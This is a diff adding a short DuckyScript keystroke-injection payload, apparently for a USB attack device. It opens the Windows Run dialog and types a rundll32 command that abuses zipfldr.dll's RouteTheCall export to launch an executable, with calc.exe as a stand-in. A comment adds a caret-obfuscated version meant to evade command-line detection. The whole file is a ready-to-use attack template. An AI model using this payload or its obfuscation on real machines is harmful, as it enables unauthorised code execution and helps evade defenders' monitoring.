@@ -1,0 +1,7 @@
+REM by JOB
+REM Launch an executable payload by calling RouteTheCall, more info here https://lolbas-project.github.io/lolbas/Libraries/Zipfldr/
+GUI r
+DEFAULT_DELAY 350
+STRING rundll32.exe zipfldr.dll,RouteTheCall calc.exe
+REM obfuscated version: rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
+ENTER
